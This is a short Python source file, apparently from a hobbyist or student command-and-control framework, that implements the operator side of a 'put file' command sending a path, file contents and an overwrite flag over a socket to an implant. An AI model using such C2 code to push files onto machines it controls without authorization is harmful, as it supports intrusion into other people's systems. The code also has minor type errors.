# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with put file functionality 

SUCCESS = 1
FAILURE = 0

# Command value
PUT = 1


'''
Description:
    Performs put file functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    filepath - path to local file to read and get bytes to write
    filename - path to write to on target
    overwrite - whether or not to overwrite the remote file if it already exists
Returns:
    SUCCESS or FAILURE 
'''
def putFile(sock, filepath, filename, overwrite):
    try:
        # First tell our implant we want a PUT file performed
        sock.send(bytes(str(PUT), "utf-8") + b'\x00')

        # Open local file and read in our bytes
        with open(filepath, 'r') as openfile:
            filebytes = openfile.read()
            openfile.close()

        # Send filepath to write to 
        sock.send(filename+ b'\x00')

        # Send file bytes
        sock.send(bytes(filebytes, 'utf-8') + b'\x00')

        # Send our overwrite
        sock.send(bytes(overwrite) + b'\x00')

        print("Sent data to implant; waiting on response code...")

        # Wait for response (should be success code)
        data = sock.recv(1024)
        print("Data received is %s\n" % data)


    except Exception as e:
        print("ERROR: Could not send put file to implant: ", e)
        return FAILURE
    return SUCCESS